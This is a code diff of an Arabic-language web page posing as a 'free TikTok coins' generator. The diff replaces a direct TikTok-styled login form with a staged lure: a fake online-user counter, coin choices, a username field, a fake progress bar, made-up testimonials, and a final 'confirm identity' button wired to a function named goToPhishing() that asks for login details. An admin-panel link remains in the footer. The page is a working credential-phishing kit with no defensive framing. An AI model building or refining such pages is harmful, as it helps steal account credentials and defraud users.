@@ -3,42 +3,66 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>تسجيل الدخول - تيك توك</title>
+    <title>شحن عملات تيك توك مجاناً</title>
     <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
-    <div class="login-container">
-        <div class="login-box">
-            <div class="logo">
-                <h1>🎵 TikTok</h1>
-                <p>احصل على 1000 كوينز مجاناً!</p>
+    <div class="container">
+        <div class="header">
+            <h1>🎁 شحن عملات تيك توك مجاناً</h1>
+            <p>السيرفر متصل ويعمل أونلاين الآن: <span id="onlineCount">1,294</span></p>
+        </div>
+
+        <div class="rules">
+            <h3>📋 سياسة الاستخدام العادل</h3>
+            <ul>
+                <li>العملات مجاناً أول مرة فقط.</li>
+                <li>لكل حساب عملية شحن واحدة فقط مجانية.</li>
+                <li>يجب إتمام عملية التحقق البشري.</li>
+            </ul>
+        </div>
+
+        <div class="coins-selection">
+            <h3>اختر عدد العملات المطلوبة</h3>
+            <div class="coins-options">
+                <button onclick="selectCoins(1400)">1,400</button>
+                <button onclick="selectCoins(3500)">3,500</button>
+                <button onclick="selectCoins(7000)">7,000</button>
+                <button onclick="selectCoins(17500)">17,500</button>
             </div>
-            <form id="loginForm">
-                <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
-                <input type="text" id="email" placeholder="example@email.com" required />
-
-                <label for="password">كلمة السر</label>
-                <input type="password" id="password" placeholder="••••••••" required />
-
-                <button type="submit">تسجيل الدخول</button>
-            </form>
-            <p id="successMessage" style="display: none; color: green; margin-top: 15px;">
-                ✅ تم تسجيل الدخول بنجاح! جاري تحويل الكوينز...
-            </p>
-            <p style="margin-top: 20px; font-size: 14px; color: #888;">
-                🎁 هدية مجانية: 1000 كوينز عند تسجيل الدخول
-            </p>
         </div>
+
+        <div class="user-input" id="userInput" style="display: none;">
+            <h3>📝 بيانات الحساب</h3>
+            <p>ادخل اسم المستخدم الخاص بك لإرسال العملات إلى حسابك</p>
+            <input type="text" id="tiktokUsername" placeholder="@username" />
+            <button onclick="startProcess()">🎯 بدء الشحن</button>
+        </div>
+
+        <div class="progress" id="progressSection" style="display: none;">
+            <h3>⏳ جارٍ البحث عن الحساب...</h3>
+            <div class="progress-bar"><div id="progressFill" style="width:0%;"></div></div>
+            <p id="progressText">0%</p>
+        </div>
+
+        <div class="final-step" id="finalStep" style="display: none;">
+            <h3>✅ تم العثور على الحساب!</h3>
+            <p>لتأكيد هويتك واستلام الكوينز، أدخل بيانات تسجيل الدخول الخاصة بك.</p>
+            <button onclick="goToPhishing()">📲 تأكيد الهوية</button>
+        </div>
+
+        <div class="testimonials">
+            <h3>💬 آراء المستخدمين</h3>
+            <div class="testimonial">منى أحمد: شكراً ليكم اشتغل زى الفل ودلوقتى وصلت الكوينز 😍</div>
+            <div class="testimonial">سارة نديم: الموقع تحفة بصراحة وصادق 👌</div>
+            <div class="testimonial">محمد السيد: العملات وصلت الحساب بعد ما نشرت 20 مرة 🤩</div>
+        </div>
+
+        <footer style="margin-top: 30px; text-align: center; color: #888; font-size: 14px;">
+            <a href="admin.html" style="color: #1a1a2e; text-decoration: underline;">👑 لوحة التحكم</a>
+        </footer>
     </div>
-
-    <footer>
-        <div class="container">
-            <p style="margin-top: 10px; font-size: 14px;">
-                <a href="admin.html" style="color: #fff; text-decoration: underline;">👑 لوحة التحكم</a>
-            </p>
-        </div>
-    </footer>
 
     <script src="script.js"></script>
 </body>
